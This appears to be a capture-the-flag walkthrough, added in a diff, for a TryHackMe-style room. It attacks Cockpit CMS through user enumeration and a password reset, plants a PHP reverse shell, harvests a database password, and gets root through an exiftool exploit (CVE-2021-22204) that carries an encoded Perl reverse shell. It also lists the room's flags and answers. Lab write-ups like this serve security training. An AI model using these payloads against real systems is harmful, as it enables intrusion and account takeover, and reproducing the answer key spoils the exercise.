@@ -329,3 +329,334 @@ if __name__ == '__main__':
 
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ python3 cockpit_enum.py -u http://10.10.228.98
+[+] http://10.10.228.98: is reachable
+[-] Attempting Username Enumeration (CVE-2020-35846) : 
+
+[+] Users Found : ['admin', 'darkStar7471', 'skidy', 'ekoparty']
+
+[-] Get user details For : skidy
+[+] Finding Password reset tokens
+	 Tokens Found : ['rp-d72d501f6207ac757ac3cb114d1a0a4760a88abe28f23', 'rp-f33c415d5d81323f5edbab4bc504e96364b0804b0484b']
+[+] Obtaining user information 
+-----------------Details--------------------
+	 [*] user : admin
+	 [*] name : Admin
+	 [*] email : admin@yourdomain.de
+	 [*] active : True
+	 [*] group : admin
+	 [*] password : $2y$10$dChrF2KNbWuib/5lW1ePiegKYSxHeqWwrVC.FN5kyqhIsIdbtnOjq
+	 [*] i18n : en
+	 [*] _created : 1621655201
+	 [*] _modified : 1621655201
+	 [*] _id : 60a87ea165343539ee000300
+	 [*] _reset_token : rp-d72d501f6207ac757ac3cb114d1a0a4760a88abe28f23
+	 [*] md5email : a11eea8bf873a483db461bb169beccec
+--------------------------------------------
+-----------------Details--------------------
+	 [*] user : skidy
+	 [*] email : skidy@tryhackme.fakemail
+	 [*] active : True
+	 [*] group : admin
+	 [*] i18n : en
+	 [*] api_key : account-21ca3cfc400e3e565cfcb0e3f6b96d
+	 [*] password : $2y$10$uiZPeUQNErlnYxbI5PsnLurWgvhOCW2LbPovpL05XTWY.jCUave6S
+	 [*] name : Skidy
+	 [*] _modified : 1621719311
+	 [*] _created : 1621719311
+	 [*] _id : 60a9790f393037a2e400006a
+	 [*] _reset_token : rp-f33c415d5d81323f5edbab4bc504e96364b0804b0484b
+	 [*] md5email : 5dfac21f8549f298b8ee60e4b90c0e66
+--------------------------------------------
+
+[+] Do you want to reset the passowrd for skidy? (Y/n): Y
+[-] Attempting to reset skidy's password:
+[+] Password Updated Succesfully!
+[+] The New credentials for skidy is: 
+ 	 Username : skidy 
+ 	 Password : exNQH:>tXd
+
+login
+
+http://10.10.228.98/finder
+
+revshell
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ tail payload_ivan.php
+}
+echo '<pre>';
+// change the host address and/or port number as necessary
+$sh = new Shell('10.8.19.103', 1337);
+$sh->run();
+unset($sh);
+// garbage collector requires PHP v5.3.0 or greater
+// @gc_collect_cycles();
+echo '</pre>';
+?>   
+
+http://10.10.228.98/payload_ivan.php
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvp 1337                                       
+listening on [any] 1337 ...
+10.10.228.98: inverse host lookup failed: Unknown host
+connect to [10.8.19.103] from (UNKNOWN) [10.10.228.98] 56084
+SOCKET: Shell has connected! PID: 1034
+python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
+www-data@ubuntu:/var/www/html/cockpit$ cd /home
+cd /home
+www-data@ubuntu:/home$ ls
+ls
+stux
+www-data@ubuntu:/home$ cd stux
+cd stux
+www-data@ubuntu:/home/stux$ ls
+ls
+user.txt
+www-data@ubuntu:/home/stux$ cat user.txt
+cat user.txt
+cat: user.txt: Permission denied
+www-data@ubuntu:/home/stux$ cd /var/www/html/cockpit
+cd /var/www/html/cockpit
+www-data@ubuntu:/var/www/html/cockpit$ ls
+ls
+CONTRIBUTING.md  addons		cp	     lib	       storage
+Dockerfile	 assets		favicon.png  modules	       webflag.php
+LICENSE		 bootstrap.php	index.php    package.json
+README.md	 composer.json	install      payload_ivan.php
+www-data@ubuntu:/var/www/html/cockpit$ cat webflag.php
+cat webflag.php
+<?php
+        $flag = "thm{f158bea70731c48b05657a02aaf955626d78e9fb}";
+?>
+
+www-data@ubuntu:/var/www/html/cockpit$ netstat -tulpn
+netstat -tulpn
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -               
+tcp6       0      0 :::80                   :::*                    LISTEN      -               
+tcp6       0      0 :::22                   :::*                    LISTEN      -               
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -      
+
+MongoDB runs on port 27017 by default
+
+www-data@ubuntu:/home/stux$ ls -la
+ls -la
+total 44
+drwxr-xr-x 4 stux stux 4096 May 22  2021 .
+drwxr-xr-x 3 root root 4096 May 21  2021 ..
+-rw-r--r-- 1 root root   74 May 22  2021 .bash_history
+-rw-r--r-- 1 stux stux  220 May 21  2021 .bash_logout
+-rw-r--r-- 1 stux stux 3771 May 21  2021 .bashrc
+drwx------ 2 stux stux 4096 May 21  2021 .cache
+-rw-r--r-- 1 root root  429 May 21  2021 .dbshell
+-rwxrwxrwx 1 root root    0 May 21  2021 .mongorc.js
+drwxrwxr-x 2 stux stux 4096 May 21  2021 .nano
+-rw-r--r-- 1 stux stux  655 May 21  2021 .profile
+-rw-r--r-- 1 stux stux    0 May 21  2021 .sudo_as_admin_successful
+-rw-r--r-- 1 root root  312 May 21  2021 .wget-hsts
+-rw------- 1 stux stux   46 May 22  2021 user.txt
+www-data@ubuntu:/home/stux$ cat .dbshell
+cat .dbshell
+show
+show dbs
+use admin
+use sudousersbak
+show dbs
+db.user.insert({name: "stux", name: "p4ssw0rdhack3d!123"})
+show dbs
+use sudousersbak
+show collections
+db
+show
+db.collectionName.find()
+show collections
+db.collection_name.find().pretty()
+db.user.find().pretty()
+db.user.insert({name: "stux"})
+db.user.find().pretty()
+db.flag.insert({name: "thm{c3d1af8da23926a30b0c8f4d6ab71bf851754568}"})
+show collections
+db.flag.find().pretty()
+
+www-data@ubuntu:/home/stux$ mongo
+mongo
+MongoDB shell version: 2.6.10
+connecting to: test
+Welcome to the MongoDB shell.
+For interactive help, type "help".
+For more comprehensive documentation, see
+	http://docs.mongodb.org/
+Questions? Try the support group
+	http://groups.google.com/group/mongodb-user
+2023-07-13T16:08:45.840-0700 In File::open(), ::open for '' failed with errno:2 No such file or directory
+> show dbs
+shshow dbs
+admin         (empty)
+local         0.078GB
+sudousersbak  0.078GB
+> use sudousersbak
+ususe sudousersbak
+switched to db sudousersbak
+> show collections
+shshow collections
+flag
+system.indexes
+user
+> db.user.find()
+dbdb.user.find()
+{ "_id" : ObjectId("60a89d0caadffb0ea68915f9"), "name" : "p4ssw0rdhack3d!123" }
+{ "_id" : ObjectId("60a89dfbaadffb0ea68915fa"), "name" : "stux" }
+> db.flag.find()
+dbdb.flag.find()
+{ "_id" : ObjectId("60a89f3aaadffb0ea68915fb"), "name" : "thm{c3d1af8da23926a30b0c8f4d6ab71bf851754568}" }
+
+www-data@ubuntu:/home/stux$ su stux
+su stux
+Password: p4ssw0rdhack3d!123
+
+stux@ubuntu:~$ sudo -l
+sudo -l
+Matching Defaults entries for stux on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User stux may run the following commands on ubuntu:
+    (root) NOPASSWD: /usr/local/bin/exiftool
+
+stux@ubuntu:~$ ls
+ls
+user.txt
+stux@ubuntu:~$ cat user.txt
+cat user.txt
+thm{c5fc72c48759318c78ec88a786d7c213da05f0ce}
+
+https://github.com/convisolabs/CVE-2021-22204-exiftool
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ git clone https://github.com/convisolabs/CVE-2021-22204-exiftool.git
+Cloning into 'CVE-2021-22204-exiftool'...
+remote: Enumerating objects: 27, done.
+remote: Counting objects: 100% (27/27), done.
+remote: Compressing objects: 100% (25/25), done.
+remote: Total 27 (delta 6), reused 17 (delta 2), pack-reused 0
+Receiving objects: 100% (27/27), 52.53 KiB | 2.50 MiB/s, done.
+Resolving deltas: 100% (6/6), done.
+                                                    
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cd CVE-2021-22204-exiftool 
+                                                    
+┌──(witty㉿kali)-[~/Downloads/CVE-2021-22204-exiftool]
+└─$ ls
+configfile  exploit.py  image.jpg  lab  README.md
+                                                    
+┌──(witty㉿kali)-[~/Downloads/CVE-2021-22204-exiftool]
+└─$ cat exploit.py            
+#!/bin/env python3
+
+import base64
+import subprocess
+
+ip = '10.8.19.103'
+port = '9090'
+
+payload = b"(metadata \"\c${use MIME::Base64;eval(decode_base64('"
+
+payload = payload + base64.b64encode( f"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in({port},inet_aton('{ip}')))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}};".encode() )
+
+payload = payload + b"'))};\")"
+
+payload_file = open('payload', 'w')
+payload_file.write(payload.decode('utf-8'))
+payload_file.close()
+
+subprocess.run(['bzz', 'payload', 'payload.bzz'])
+subprocess.run(['djvumake', 'exploit.djvu', "INFO=1,1", 'BGjp=/dev/null', 'ANTz=payload.bzz'])
+subprocess.run(['exiftool', '-config', 'configfile', '-HasselbladExif<=exploit.djvu', 'image.jpg']) 
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2021-22204-exiftool]
+└─$ python3 exploit.py
+    1 image files updated
+                                                                                       
+┌──(witty㉿kali)-[~/Downloads/CVE-2021-22204-exiftool]
+└─$ ls
+configfile    exploit.py  image.jpg_original  payload      README.md
+exploit.djvu  image.jpg   lab                 payload.bzz
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2021-22204-exiftool]
+└─$ rlwrap nc -lvp 9090
+listening on [any] 9090 ...
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2021-22204-exiftool]
+└─$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+
+stux@ubuntu:/tmp$ wget http://10.8.19.103:1234/exploit.djvu
+wget http://10.8.19.103:1234/exploit.djvu
+--  http://10.8.19.103:1234/exploit.djvu
+Connecting to 10.8.19.103:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 338 [image/vnd.djvu]
+Saving to: ‘exploit.djvu’
+
+exploit.djvu          0%[                    ]       0  --.-KB/s              exploit.djvu        100%[===================>]     338  --.-KB/s    in 0s      
+
+(51.4 MB/s) - ‘exploit.djvu’ saved [338/338]
+
+stux@ubuntu:/tmp$ sudo /usr/local/bin/exiftool exploit.djvu
+sudo /usr/local/bin/exiftool exploit.djvu
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2021-22204-exiftool]
+└─$ rlwrap nc -lvp 9090
+listening on [any] 9090 ...
+10.10.228.98: inverse host lookup failed: Unknown host
+connect to [10.8.19.103] from (UNKNOWN) [10.10.228.98] 33694
+```
+```text
+# cd /root
+```
+
+## Privilege Escalation
+```text
+# ls
+root.txt
+```
+```text
+# cat root.txt
+thm{bf52a85b12cf49b9b6d77643771d74e90d4d5ada}
+```
+What is the name of the Content Management System (CMS) installed on the server?
+*Cockpit*
+What is the version of the Content Management System (CMS) installed on the server?
+*0.11.1*
+What is the path that allow user enumeration?
+*/auth/check*
+How many users can you identify when you reproduce the user enumeration attack?
+*4*
+What is the path that allows you to change user account passwords?
+*/auth/resetpassword*
+Compromise the Content Management System (CMS). What is Skidy's email.
+*skidy@tryhackme.fakemail*
+What is the web flag?
+Compromise the machine and enumerate collections in the document database installed in the server. What is the flag in the database?
+Contains more secrets
+What is the user.txt flag?
+What is the CVE number for the vulnerability affecting the binary assigned to the system user? Answer format: CVE-0000-0000
+*CVE-2021-22204*
+What is the utility used to create the PoC file?
+*djvumake*
+Escalate your privileges. What is the flag in root.txt?
+
+## Flags / Answers
+- ***thm{f158bea70731c48b05657a02aaf955626d78e9fb}***
+- ***thm{c3d1af8da23926a30b0c8f4d6ab71bf851754568}***
+- ***thm{c5fc72c48759318c78ec88a786d7c213da05f0ce}***
+- ***thm{bf52a85b12cf49b9b6d77643771d74e90d4d5ada}***
+
+## Notes / Lessons Learned
+[[The Server From Hell]]
+
